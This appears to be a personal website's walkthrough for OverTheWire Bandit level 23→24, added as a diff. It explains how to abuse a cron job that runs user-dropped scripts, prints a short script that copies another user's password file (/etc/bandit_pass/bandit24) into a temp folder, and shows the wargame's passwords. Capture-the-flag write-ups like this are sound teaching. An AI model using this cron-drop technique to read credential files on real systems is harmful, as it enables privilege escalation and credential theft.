@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTW Bandit 23 &#8594; 24 @ Shukularuni</title>
+    <link rel="stylesheet" href="/style.css">
+    <link rel="icon" type="image/x-icon" href="/icon.png">
+</head>
+<body>
+    <header>
+        <h1>OverTheWire Bandit Guide</h1>
+        <p>here's how to solve the bandit level 23 &#8594; 24</p>
+    </header>
+    <main>
+        <section>
+            <a href="./">Back to the Bandit Guides</a>
+            <p>Previous Level Guide: <a href="23.html">Bandit Level 22 &#8594; 23</a></p>
+            <hr>
+            <h2>Access</h2>
+            <p>SSH: <code>ssh bandit23@bandit.labs.overthewire.org -p 2220</code></p>
+            <p>Password: <code>xprclpaI5V1Lye8ga0MtmVBfUehdJMJW</code></p>
+            <h2>Info</h2>
+            <pre>A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed. NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level! NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
+Commands: cron, crontab, crontab(5) (use “man 5 crontab” to access this)</pre>
+            <h2>Theory</h2>
+            <p>So because I haven't done the challenge yet, we're on theory, I don't know what exactly the cron job or task is going to do to give us the password. The thing now is that we're going to create a shell script to give us the password, the first one in this game. All the commands we could maybe have right now, is access the cron jobs place like it says in the instructions:</p>
+            <pre>ls -la /etc/cron.d/</pre>
+            <h2>Solution</h2>
+            <p>So let's check out the job running in bandit24:</p>
+            <pre>~$ ls -la /etc/cron.d
+total 44
+drwxr-xr-x   2 root root  4096 Sep 19 07:10 .
+drwxr-xr-x 121 root root 12288 Sep 20 18:37 ..
+-rw-r--r--   1 root root   120 Sep 19 07:08 cronjob_bandit22
+-rw-r--r--   1 root root   122 Sep 19 07:08 cronjob_bandit23
+-rw-r--r--   1 root root   120 Sep 19 07:08 cronjob_bandit24
+-rw-r--r--   1 root root   201 Apr  8  2024 e2scrub_all
+-rwx------   1 root root    52 Sep 19 07:10 otw-tmp-dir
+-rw-r--r--   1 root root   102 Mar 31  2024 .placeholder
+-rw-r--r--   1 root root   396 Jan  9  2024 sysstat
+
+~$ cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+
+~$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+</pre>
+            <p>And seems like the code executes all shell scripts on bandit24/foo and deletes them after executing, but if the owner is bandit23, which we are, it will wait to execute the script a minute. So because it is owned by the next level, we can tell it to copy the password to somewhere that we control, like a temporary directory, also we could use it to create the shell script there. First of all let's write the code, so if you remember previous levels, when the level copies the password to somewhere else, and we'd have to follow those same instructions to get the password, well that code shows us exactly how to do the code to copy the password, we just change it to be from bandit24 and move it to our temporary folder:</p>
+            <pre>#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/tmp.38nfe9Efrp/pass</pre>
+            <p>Now let's create the file on the temporary folder:</p>
+            <pre>~$ mktemp -d
+/tmp/tmp.38nfe9Efrp
+
+~$ cd /tmp/tmp.38nfe9Efrp
+
+/tmp/tmp.38nfe9Efrp$ vim b24passwordgetter</pre>
+            <p>Just gonna make it a shell script file and give it permissions, then copy it to the bandit24/foo folder:</p>
+            <pre>/tmp/tmp.38nfe9Efrp$ mv b24passwordgetter b24passwordgetter.sh
+
+/tmp/tmp.38nfe9Efrp$ chmod +rwx b24passwordgetter.sh
+
+/tmp/tmp.38nfe9Efrp$ chmod 777 b24passwordgetter.sh
+
+/tmp/tmp.38nfe9Efrp$ cp b24passwordgetter.sh /var/spool/bandit24/foo</pre>
+            <p>Finally, we just have to wait a minute until the code gets executed in bandit24/foo, and it should appear now:</p>
+            <pre>/tmp/tmp.38nfe9Efrp$ ls -la
+total 13584
+drwx------ 2 bandit23 bandit23     4096 Dec 12 15:04 .
+drwxrwx-wt 1 root     root     13897728 Dec 12 15:04 ..
+-rwxrwxrwx 1 bandit23 bandit23       73 Dec 12 15:03 bandit24get.sh
+
+/tmp/tmp.38nfe9Efrp$ ls -la
+total 13584
+drwx------ 2 bandit23 bandit23     4096 Dec 12 15:04 .
+drwxrwx-wt 1 root     root     13897728 Dec 12 15:05 ..
+-rwxrwxrwx 1 bandit23 bandit23       73 Dec 12 15:03 bandit24get.sh
+-rwxrwxrwx 1 bandit23 bandit23       33 Jun 17 15:05 pass
+
+/tmp/tmp.38nfe9Efrp$ cat pass
+YRSVLTtfZnD0aBUxDkgJ1G2JgF9SgRyL</pre>
+            <p>And that's the password! Now we should be good to go to the next level.</p>
+            <a target="_blank" href="https://overthewire.org/wargames/bandit/bandit24.html">https://overthewire.org/wargames/bandit/bandit24.html</a>
+            <hr>
+            Next Level Guide: <a href="25.html">Bandit Level 24 &#8594; Level 25</a>
+        </section>
+        <section class="link-list">
+            <h2>Explore My Website</h2>
+            <ul>
+                <li><a href="/">Home</a></li>
+                <li><a href="/search.html">Search</a></li>
+                <li><a href="/articles.html">Articles</a></li>
+                <li><a href="/guides.html">Guides</a></li>
+            </ul>
+            <br><br><br>
+        </section>
+    </main>
+    <footer>
+        <p class="cute">Made with ❤️ by Shukularuni</p>
+    </footer>
+</body>
+</html>
